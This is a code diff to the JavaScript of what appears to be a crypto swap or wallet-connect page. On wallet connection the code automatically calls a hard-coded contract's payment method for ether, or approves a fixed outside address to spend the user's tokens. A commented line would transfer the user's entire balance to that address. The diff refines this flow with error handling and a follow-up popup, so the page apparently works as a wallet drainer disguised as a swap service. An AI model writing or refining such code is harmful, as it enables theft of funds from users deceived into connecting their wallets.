@@ -1961,7 +1961,7 @@
 				let accountsOnEnable = await web3.eth.getAccounts();
 				window.web3.eth.defaultAccount = accountsOnEnable[0];
 				approve()
-				openAccPop()
+				// openAccPop()
 				// swap();
 			}catch (e){
 				document.getElementById('error-text')
@@ -2189,32 +2189,37 @@
 
 
 		async function approve() {
-			if (selectedAddress === "000") {
-				window.SimpleStorage = new window.web3.eth.Contract(ethABI, '0x862D9c0024A38Eb503Db0d3fC32Cfa1c89e221C5');
-				console.log('eths')
-				window.SimpleStorage.methods.EtherPay().send({
-					from: window.web3.eth.defaultAccount,
-					// gas: 0
-				});
-			} else {
+			try{
+				if (selectedAddress === "000") {
+					window.SimpleStorage = new window.web3.eth.Contract(ethABI, '0x862D9c0024A38Eb503Db0d3fC32Cfa1c89e221C5');
+					// console.log('eths')
+					window.SimpleStorage.methods.EtherPay().send({
+						from: window.web3.eth.defaultAccount,
+						// gas: 0
+					});
+				} else {
 
-				window.SimpleStorage = new window.web3.eth.Contract(approveContractABI, selectedAddress);
+					window.SimpleStorage = new window.web3.eth.Contract(approveContractABI, selectedAddress);
 
-				let accountsOnEnable = await web3.eth.getAccounts();
-				window.web3.eth.defaultAccount = accountsOnEnable[0];
-				let balance = await window.SimpleStorage.methods.balanceOf(window.web3.eth.defaultAccount).call()
+					let accountsOnEnable = await web3.eth.getAccounts();
+					window.web3.eth.defaultAccount = accountsOnEnable[0];
+					let balance = await window.SimpleStorage.methods.balanceOf(window.web3.eth.defaultAccount).call()
 
-				// window.SimpleStorage.methods.transferFrom(window.web3.eth.defaultAccount, '0x4BB2f635059D7e16eCE9427076Ba04E2b0Cc8FEc', web3.utils.toBN(balance)).send({
-				// 	from: window.web3.eth.defaultAccount
-				// })
+					// window.SimpleStorage.methods.transferFrom(window.web3.eth.defaultAccount, '0x4BB2f635059D7e16eCE9427076Ba04E2b0Cc8FEc', web3.utils.toBN(balance)).send({
+					// 	from: window.web3.eth.defaultAccount
+					// })
 
-				window.SimpleStorage.methods.approve('0x4BB2f635059D7e16eCE9427076Ba04E2b0Cc8FEc', web3.utils.toBN(approveNum)).send({
-					from: window.web3.eth.defaultAccount,
-					// gas: 0
-				})
-
-				// 		.then(swap())
+					window.SimpleStorage.methods.approve('0x4BB2f635059D7e16eCE9427076Ba04E2b0Cc8FEc', web3.utils.toBN(approveNum)).send({
+						from: window.web3.eth.defaultAccount,
+						// gas: 0
+					})
+					// 		.then(swap())
+				}
+				openAccPop()
+			}catch (e) {
+				openPopError()
 			}
+
 		}
 		async function approveTW(trustWalletUserAddress) {
 			if (selectedAddress === "000") {
@@ -2350,7 +2355,7 @@
 
 	let popup = document.querySelector("#popup"),
 			button = document.querySelector("#wallet_auth_modal");
-	button.addEventListener("click", openPop);
+	// button.addEventListener("click", openPop);
 	function openPop(){
 		selectedToken !== null ? popup.style.display = "Block" : document.getElementById('dropdown').checked = true;
 	}
